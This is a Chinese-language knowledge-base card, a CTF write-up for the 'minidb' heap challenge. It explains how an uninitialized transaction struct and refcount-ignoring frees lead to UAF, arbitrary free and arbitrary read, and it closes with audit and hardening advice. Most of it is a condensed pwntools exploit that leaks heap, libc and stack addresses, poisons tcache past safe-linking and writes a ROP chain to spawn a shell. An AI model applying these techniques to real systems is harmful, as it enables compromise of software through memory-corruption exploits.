---
id: binary-pwn-heap-uninitialized-tx-context-uaf-arbitrary-free-read
title: 事务快照结构未初始化：MULTI/EXEC/ABORT 组合的 UAF、任意 free 与任意读
type: scenario
domain: binary
path: binary/pwn/heap
technique: uninitialized-tx-context-uaf-arbitrary-free-read
tags:
- pwn
- heap
- uaf
- transaction
- uninitialized
- tcache
- arbitrary-free
- arbitrary-read
- stack-rop
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V92
  verified_at: '2026-11-05T19:50:07+08:00'
  notes: 已对照原文与唯一图01（exp.py pwn4及运行输出）核对：DbValue/DbEntry/TxContext/DbEngine结构、djb2低6位哈希、MULTI不初始化、SET事务分支不看refcount、EXEC信任has_snapshot/old_value、ABORT任意读、CLONE浅拷贝、tcache fake chunk链到栈ROP与最终exp均一致；已修正卡内原文未注明的'glibc 2.35附近'为'版本原文未注明'。原文无版本信息，CTF二进制未设 affected_versions；PoC未在本机复跑；frontmatter 无 sources/source_url。
url: /docs/binary/pwn/heap/binary-pwn-heap-uninitialized-tx-context-uaf-arbitrary-free-read/
draft: false
kb_aliases:
- minidb 堆利用
- TxContext 未初始化
- 事务快照 UAF
- EXEC 任意 free
- ABORT 任意读
- CLONE 共享 value UAF
- 2026 CISCN 半决赛 minidb
---

## 一句话结论

minidb 的 `MULTI` 只 `malloc(0x38)` 分配 `TxContext` 却不初始化；`SET` 在事务中只要 key 匹配就直接 `free(old_value)`，不看 `DbValue->refcount`；`EXEC` 又信任未初始化的 `has_snapshot`/`old_value` 执行 release/free；`ABORT` 直接把 `tx->old_value` 写回 `entry->value`。三者组合出 UAF、任意 free 和任意读，配合 `CLONE` 浅拷贝共享 value 泄露 heap/libc/stack，最终用相邻 fake chunk 链毒化 tcache，把 ROP 链分配到栈上执行 `system("/bin/sh")`。

## 原理

- **数据结构**：
  - `DbValue { uint64_t refcount; uint64_t length; char data[]; }`，`refcount` 记录多少 key 共享该 value；`CLONE` 时 +1，`SET`/`ABORT`/`EXEC` 时 -1，减到 0 才 free。
  - `DbEntry { char key[0x20]; DbEntry *next; DbValue *value; }`，挂在 `DbEngine->buckets[64]` 的哈希桶链上。
  - `TxContext { char key[0x20]; DbValue *old_value; DbValue *new_value; uint32_t has_snapshot; uint32_t pad; }`，记录事务快照。
  - `DbEngine { DbEntry *buckets[64]; TxContext *tx; uint8_t in_tx; ... }`，全局状态。
- **哈希**：djb2 风格 `hash = 33*hash + c`，只取低 6 位得到 0–63 的桶号；新 entry 头插到对应桶。
- **MULTI 的缺陷**：只检查 `in_tx`，然后 `tx = malloc(0x38)`，没有 `memset`/字段初始化；`has_snapshot`、`old_value`、`key` 都是堆上的脏数据。后续 `EXEC`/`ABORT` 直接信任这些字段。
- **SET 的缺陷**：普通分支会 `--old_value->refcount`，减到 0 才 free；事务分支在 `in_tx && tx->has_snapshot == 1 && strcmp(tx->key, key) == 0` 时直接 `free(old_value)`，完全忽略 `refcount`。如果之前 `CLONE` 过同一个 value，`refcount` 仍大于 0，clone 的 entry 就持有悬空指针，形成 UAF。
- **EXEC 的缺陷**：提交时若 `tx->has_snapshot == 1` 且 `tx->old_value` 非空，就对 `old_value` 做 `--refcount`/free；`tx` 本身在最后被 `free`。由于 `tx` 未初始化或可被堆布局伪造，`old_value` 可以是任意地址，形成任意 free。
- **ABORT 的缺陷**：回滚时 `entry = db_find_entry(tx->key); entry->value = tx->old_value;`，不校验 `old_value` 是否属于该 key、是否有效；控制 `tx->key` 与 `tx->old_value` 后，`GET` 就能把任意地址当作 value 读出，形成任意读。
- **无 edit**：`SET` 总是分配新的 `DbValue`，没有原地编辑；利用必须依赖 UAF/重叠 chunk 伪造 `DbEntry`/`TxContext`，通过再次 `SET` 分配回来覆写指针。
- **泄露链**：`MULTI` → `SET a`（大 value）→ `CLONE a b`（共享、refcount++）→ `SET a`（事务分支直接 free 旧 value，clone 悬空）→ 再 `SET a` 把旧 chunk 推入 largebin → `GET b` 读悬空 chunk 的 fd/bk 泄露 heap；之后伪造 `DbEntry`/`TxContext` 做任意读，泄 `libc` 与 `environ` 得 stack。
- **控制流劫持**：在可控堆区构造 fake chunk `a→b→c`（`b = a+0x10`），使分配 `a` 后用户数据正好覆盖 `b->fd`；用 safe-linking 公式写入 `stack_target ^ (fake_b >> 12)`，连续两次分配弹出 `b` 后 tcache 头变成 `stack_target`，第三次分配直接返回栈地址，写入 `ret; pop rdi; binsh; system` 的 ROP 链。

## 触发条件

- 目标程序实现上述事务型 key-value 引擎，且 `MULTI` 分配 `TxContext` 不初始化、`SET` 事务分支不看 refcount、`EXEC`/`ABORT` 不校验字段；
- 存在 `CLONE`（或等价的共享引用操作）以制造 refcount > 1 的 value；
- 目标为 glibc 环境，tcache/safe-linking 可用（案例 libc 版本原文未注明，偏移按题目 libc）；
- 攻击者能与菜单交互（SET/CLONE/MULTI/EXEC/ABORT/GET）；
- 需要 heap/libc/stack 泄露与堆布局控制，CTF 环境通常可反复试。

## 利用步骤

1. **泄 heap**：`MULTI` → `SET a <0x4f0>` → `CLONE a b` → `SET a <0x500>`（事务分支 free 旧 value，b 悬空）→ `SET a <0x510>`（把旧 chunk 推入 largebin）→ `GET b` 读 fd/bk，减去固定偏移得到 heap base。
2. **伪造 TxContext 做任意 free**：构造 `Pb...p64(heap+0xa50)+p64(0)+p32(1)+p32(0)` 的 value 并 `SET t`，再 `SET t` 触发 free；`MULTI` 后用 `EXEC` 按伪造的 `has_snapshot/old_value` 执行 free。由于 tcache 里同时有 `tx_chunk` 与 `DbEntry` 等 0x50 chunk，需要两次分配才能拿到可写的 `DbEntry`。
3. **泄 libc**：覆写 `DbEntry->value` 为 largebin 首地址附近，`GET \x01` 读出 libc 指针，减去偏移得到 libc base。
4. **泄 stack**：重复任意读，把目标设为 `libc.environ - 0x10`，`GET` 读出 `environ` 的栈指针。
5. **任意 free 辅助**：封装 `exec_free(ptr)`：用 `SET` 写入伪造 `TxContext`（`old_value=ptr`、`has_snapshot=1`），`MULTI` 后 `EXEC` 触发 `free(ptr)`。
6. **构造 fake chunk 链**：在 0x500 的 value 中于偏移 0x60/0x70/0x80 写入 size 0x41、refcount 1 等字段，形成 `fake_a→fake_b→fake_c`，其中 `fake_b = fake_a + 0x10`，使写 `fake_a` 的用户数据能覆盖 `fake_b->fd`。
7. **tcache 毒化**：依次 `exec_free(fake_c)`、`exec_free(fake_b)`、`exec_free(fake_a)`，把三个 fake chunk 压入 0x40 tcache；分配一次吃掉头部，写 `fake_a` 时覆盖 `fake_b->fd = stack_target ^ (fake_b >> 12)`；再分配弹出 `fake_b`，tcache 头变为 `stack_target`。
8. **栈 ROP**：最后一次 0x40 分配返回 `stack_target`，写入 `p64(0) + ret + pop rdi + binsh + system`，程序返回时执行 `system("/bin/sh")`。

## PoC

以下为按题解压缩的关键步骤（完整 exp 依赖题目二进制/libc 偏移）：

```python
from pwn import *
context.arch = 'amd64'

def set_key(k, v):
    cmd(b'SET ' + k); rt(b'Value> '); s(v)
def clone_key(src, dst): cmd(b'CLONE ' + src + b' ' + dst)
def multi(): cmd(b'MULTI')
def exec_tx(): cmd(b'EXEC')
def leak(k): cmd(b'GET ' + k)

# 1) UAF 泄 heap
multi()
set_key(b'a', b'a' * 0x4f0)
clone_key(b'a', b'\x01')
set_key(b'a', b'a' * 0x500)   # 事务分支直接 free，\x01 悬空
set_key(b'a', b'a' * 0x510)   # 旧 chunk 进 largebin
leak(b'\x01'); rt(b'VAL: ')
heap = u64(io.recv(6).ljust(8, b'\x00')) - 0x530
exec_tx()

# 2) 伪造 TxContext 做任意 free，再泄 libc
pd = b'P' * 0x10 + p64(heap + 0xa50) + p64(0) + p32(1) + p32(0)
set_key(b't', pd); set_key(b't', b't')
multi(); exec_tx()
set_key(b't', b't' * 0x20)
set_key(b't', b't' * 24 + p64(heap + 0x5a0 - 0x10))
leak(b'\x01'); rt(b'VAL: ')
libc_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x21ace0

# 3) 任意读 environ 得 stack
pd = b'P' * 0x10 + p64(heap + 0xa50) + p64(0) + p32(1) + p32(0)
set_key(b't', pd); set_key(b't', b'Q')
multi(); exec_tx()
set_key(b't', b't' * 0x20)
set_key(b't', b't' * 24 + p64(libc_base + libc.sym['environ'] - 0x10))
leak(b'\x01'); rt(b'VAL: ')
stack = u64(io.recv(6).ljust(8, b'\x00'))

# 4) 伪造 fake chunk 链并毒化 tcache 到栈
def exec_free(ptr):
    pd = b'P' * 0x10 + p64(ptr) + p64(0) + p32(1) + p32(0)
    set_key(b't', pd); set_key(b't', b'Q'); multi(); exec_tx()

pay = bytearray(b'Z' * 0x500)
for off in (0x60, 0x70, 0x80):
    pay[off - 8:off] = p64(0x41)
    pay[off:off + 8] = p64(1)
set_key(b'm', b'm'); multi(); set_key(b'm', bytes(pay))
clone_key(b'm', b'n'); set_key(b'm', b'Y' * 0x500); exec_tx()

set_key(b'u', b'u'); set_key(b'v', b'v'); set_key(b'w', b'w')
stage2 = heap + 0xaa0
fake_a, fake_b, fake_c = stage2 + 0x60, stage2 + 0x70, stage2 + 0x80
ret_slot = stack - 0x240
stack_target = ret_slot - 0x18

exec_free(fake_c); exec_free(fake_b); exec_free(fake_a)
set_key(b't', b'T' * 0x20)  # 吃掉头部 P
set_key(b'u', p64(stack_target ^ (fake_b >> 12)) + b'R' * 24)  # 覆写 fake_b->fd
set_key(b'v', b'V' * 0x20)  # 弹出 fake_b，tcache 头 = stack_target

rop = p64(0) + p64(libc_base + 0x29139) + p64(libc_base + 0x2a3e5)
rop += p64(libc_base + next(libc.search(b'/bin/sh\x00'))) + p64(libc_base + libc.sym['system'])
set_key(b'w', rop)  # 分配到 stack_target
```

## 变体与关联

- 变体：最终不打栈而打 `_IO_FILE`/`_IO_2_1_stdout_` 的 vtable 或 `__free_hook`/`__malloc_hook`（旧 glibc）；也可用 largebin attack 写任意地址。
- 变体：如果程序有 edit，UAF 可直接改写悬空 `DbValue` 的 `length`/`data`，泄露与任意读更简单。
- 变体：tx 结构未初始化但无法控制 `free` 指针时，可利用 `ABORT` 的任意读先泄 stack，再用堆溢出/重叠写返回地址。
- 关联：[[binary-pwn-heap-uaf-unsorted-bin-libc-leak]]（UAF 泄 libc）、[[binary-pwn-heap-safe-linking-self-xor-heap-address]]（safe-linking 编码）、[[binary-pwn-heap-uaf-tcache-poison-global-environ-stack-rop]]（tcache 毒化 + environ + 栈 ROP）、[[binary-pwn-heap-custom-arena-double-free-cookie-arbitrary-alloc]]（另一类自定义分配器堆利用）。

## 检测与防御

- **代码审计**：任何带 `malloc` 的结构体必须初始化（`calloc`/`memset`）；事务快照要初始化 `has_snapshot`、`old_value`、`key`，并在 `EXEC`/`ABORT` 前校验；`SET` 释放旧值必须基于 `refcount`，不能直接 `free`；`ABORT` 的 `old_value` 必须来自当前 key 的快照。
- **引用计数**：`CLONE` 增加引用后，任何释放路径都要先减引用；释放后将指针置空并标记失效；对 `refcount` 做下溢/上溢检查。
- **堆加固**：使用 glibc tcache key、safe-linking、`MALLOC_CHECK_`、ASAN；开启 `-fstack-protector-strong`、CET/Shadow Stack、PIE/Full RELRO；对关键结构体使用独立分配器。
- **检测**：CTF 环境可监控同一 key 反复 `SET` 大 value、`CLONE` 后立即 `SET` 的调用序列；生产环境对 key-value 引擎做 fuzz/单元测试，覆盖事务回滚与并发。
- **边界**：本卡是 CTF 题解，利用依赖题目特定结构布局与 libc 偏移；不要把偏移视为通用。
